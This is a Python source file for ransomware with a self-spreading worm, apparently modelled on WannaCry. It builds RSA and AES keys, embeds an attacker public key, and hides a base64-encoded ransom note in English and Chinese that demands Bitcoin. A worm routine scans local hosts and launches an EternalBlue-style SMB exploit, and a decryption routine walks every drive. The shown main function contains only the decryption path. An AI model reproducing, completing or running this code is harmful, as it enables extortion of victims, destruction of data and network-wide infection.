from __future__ import print_function
import os
import sys
import rsa
import random

from threading import Thread

from lib.system_manager import check_os, get_hosts_ip, get_drives
from lib.en_decrypt import Encrypt, Decrypt, rsa_long_encrypt, rsa_long_decrypt
from lib.eternal_checker import checker
from lib.zzz_exploit import exp_main

from base64 import b64encode
from base64 import b64decode
# from ctypes import windll

def npass(length):
    if not isinstance(length, int) or length < 8:
        raise ValueError("temp password must have positive length")

    chars = "abcdefghijklmnopqrstvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    x = os.urandom(length)
    x = x.decode('latin1')
    return "".join(chars[ord(c) % len(chars)] for c in x)

def generated():
    hack_rsa_public_key = b'-----BEGIN RSA PUBLIC KEY-----\nMCgCIQCkxOKKa5K+hA7wtsbCPZ1TCyar1QLuh5K6uvvcANT6sQIDAQAB\n-----END RSA PUBLIC KEY-----'
    (pubkey, privkey) = rsa.newkeys(2048)
    pub = pubkey.save_pkcs1()
    priv = privkey.save_pkcs1()
    aes_key = npass(16)
    en_aes_key = b64encode(rsa_long_encrypt(pub, aes_key.encode())).decode()
    en_privkey = b64encode(rsa_long_encrypt(hack_rsa_public_key, priv)).decode()
    return (aes_key, en_aes_key, en_privkey)

def get_en_msg_key():
    aes_key, uid, privkey = generated()

    address = 'Your BTC address'

    email = 'Your email'

    msg ="77u/RU5HTElTSDoKI1doYXQgaGFwcGVuZWQ/CkFMTCB5b3VyIGltcG9ydGFudCBmaWxlcyhkYXRhYmFzZSxkb2N1bWVudHMsaW1hZ2VzLHZpZGVvcyxtdXNpYyxldGMuKWhhdmUgYmVlbiBlbmNyeXB0ZWQhCkFuZCBvbmx5IHdlIGNhbiBkZWNyeXB0IQpUbyBkZWNyeXB0IHlvdXIgZmlsZXMseW91IG5lZWQgdG8gYnV5IHRoZSBkZWNyeXB0aW9uIGtleSBmcm9tIHVzLgpXZSBhcmUgdGhlIG9ubHkgb25lIHdobyBjYW4gZGVjcnlwdCB0aGUgZmlsZSBmb3IgeW91LgoKI0F0dGVudGlvbiEKVHJ5aW5nIHRvIHJlaW5zdGFsbCB0aGUgc3lzdGVtIGFuZCBkZWNyeXB0aW5nIHRoZSBmaWxlIHdpdGggYSB0aGlyZC1wYXJ0eSB0b29sIHdpbGwgcmVzdWx0CmluIGZpbGUgY29ycnVwdGlvbix3aGljaCBtZWFucyBubyBvbmUgY2FuIGRlY3J5cHQgeW91ciBmaWxlLihpbmNsdWRpbmcgdXMpLAppZiB5b3Ugc3RpbGwgdHJ5IHRvIGRlY3J5cHQgdGhlIGZpbGUgeW91cnNlbGYseW91IGRvIHNvIGF0IHlvdXIgb3duIHJpc2shCgojVGVzdCBkZWNyeXB0aW9uIQpBcyBhIHByb29mLHlvdSBjYW4gZW1haWwgdXMgMyBmaWxlcyB0byBkZWNyeXB0LAphbmQgd2Ugc3RpbGwgc2VuZCB5b3UgdGhlIHJlY292ZXJlZCBmaWxlcyB0byBwcm92ZSB0aGF0IHdlIGNhbiBkZWNyeXB0IHlvdXIgZmlsZXMuCgojSG93IHRvIGRlY3J5cHQ/CjEuQnV5ICgwLjIpIEJpdGNvaW4uCjIuU2VuZCAoMC4yKSBCaXRjb2luIHRvIHRoZSBwYXltZW50IGFkZHJlc3MuCjMuRW1haWwgeW91ciBJRCB0byB1cyxhZnRlciB2ZXJpZmljYXRpb24sd2Ugd2lsbCBjcmVhdGUgYSBkZWNyeXB0aW9uIHRvb2wgZm9yIHlvdS4KClJlbWVtYmVyLGJhZCB0aGluZ3MgaGF2ZSBoYXBwZW5lZCxub3cgbG9vayBhdCB5b3VyIGRldGVybWluYXRpb24gYW5kIGFjdGlvbiEKCllvdXIgSUQ6I3VpZApFLW1haWw6I2VtYWlsClBheW1lbnQ6I2FkZHJlc3MKUHJpdmtleTojcHJpdmtleQoKCuS4reaWh++8mgoj5Y+R55Sf5LqG5LuA5LmIPwrmgqjmiYDmnInnmoTph43opoHmlofku7bvvIjmlbDmja7lupPjgIHmlofmoaPjgIHlm77lg4/jgIHop4bpopHjgIHpn7PkuZDnrYnvvInlt7LooqvliqDlr4bvvIHlubbkuJTlj6rmnInmiJHku6zmiY3og73op6Plr4bvvIEKCiPms6jmhI/kuovpobnvvIEK5bCd6K+V6YeN5paw5a6J6KOF57O757uf5bm25L2/55So56ys5LiJ5pa55bel5YW36Kej5a+G5paH5Lu25bCG5a+86Ie05paH5Lu25o2f5Z2P77yM6L+Z5oSP5ZGz552A5rKh5pyJ5Lq65Y+v5Lul6Kej5a+G5oKo55qE5paH5Lu2Cu+8iOWMheaLrOaIkeS7rO+8ie+8jOWmguaenOaCqOS7jeWwneivleiHquihjOino+WvhuaWh+S7tu+8jOWImemcgOiHquihjOaJv+aLhemjjumZqe+8gQoKI+a1i+ivleino+Wvhu+8gQrkvZzkuLror4HmmI7vvIzmgqjlj6/ku6XpgJrov4fnlLXlrZDpgq7ku7blkJHmiJHku6zlj5HpgIEz5Liq6KaB6Kej5a+G55qE5paH5Lu277yM5oiR5Lus5Lya5bCG5oGi5aSN5ZCO55qE5paH5Lu25Y+R6YCB57uZ5oKo77yMCuS7peivgeaYjuaIkeS7rOWPr+S7peino+WvhuaCqOeahOaWh+S7tuOAggoKI+WmguS9leino+WvhgoxLui0reS5sCAoMC4yKSDkuKrmr5TnibnluIEKMi7lsIYgKDAuMikg5LiqIOavlOeJueW4geWPkemAgeWIsOS7mOasvuWcsOWdgAozLuWwhuaCqOeahElE6YCa6L+H55S15a2Q6YKu5Lu25Y+R6YCB57uZ5oiR5Lus77yM57uP5qC45a6e5ZCO77yM5oiR5Lus5bCG5Li65oKo5Yi25L2c6Kej5a+G5bel5YW3Cgror7forrDkvY/vvIzmnIDlnY/nmoTkuovmg4Xlt7Lnu4/lj5HnlJ/kuobvvIznjrDlnKjlsLHnnIvmgqjnmoTlhrPlv4PlkozooYzliqjkuobvvIEKCuaCqOeahElE77yaI3VpZArpgq7nrrHlnLDlnYDvvJojZW1haWwK5LuY5qy+5Zyw5Z2A77yaI2FkZHJlc3MK6Kej5a+G56eB6ZKl77yaI3ByaXZrZXkK"
    msg = b64decode(msg)
    msg = msg.decode('utf-8')
    msg = msg.replace("#uid",uid)
    msg = msg.replace("#email",email)
    msg = msg.replace('#address',address)
    msg = msg.replace('#privkey',privkey)
    msg = msg.encode('utf-8')
    return (aes_key, msg)

def get_de_key():
    with open(sys.argv[2], "rb") as f:
        hack_rsa_privacy_key = f.read()

    en_aes_key = b64decode(b"hNjALvjhXUT4Uk6pMmC30o4hhhFDhtbPQzhYzUl+bsWjDHer2fvCTQKGJ2hmEb4TDWx2s0huNPCSO46vo2BVUw==")
    en_user_rsa_privacy_key = b64decode(b"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")

    user_rsa_privacy_key = rsa_long_decrypt(hack_rsa_privacy_key, en_user_rsa_privacy_key)
    aes_key = rsa_long_decrypt(user_rsa_privacy_key, en_aes_key).decode()

    return aes_key

def worm():
    # 蠕虫函数
    hosts = get_hosts_ip()
    if hosts:
        for ip in hosts:
            checker_out = checker(ip)
            if checker_out:
                exp_main(ip)

def main():
    # 主函数
    os_system = check_os() # 操作系统检测
    if len(sys.argv) == 3:
        # 解密
        if sys.argv[1]=='de' and os.path.isfile(sys.argv[2]):
            # 获取解密key
            aes_key = get_de_key()
            if os_system=='windows':
                drives = get_drives()
                # drives = [r"C:\Users\Lenovo\Desktop\wannacry"]
                for drive in drives:
                    t = Thread(target=Decrypt, args=(drive,aes_key))
                    t.start()
                desk = os.path.join(os.path.expanduser("~"), 'Desktop') + "\\"
                back_file = desk + "HOW_TO_BACK_FILES.txt"
                if os.path.exists(back_file):
                    os.remove(back_file)
            else:
                t = Thread(target=Decrypt, args=("/",aes_key))
                t.start()
    

if __name__ == '__main__':
    main()

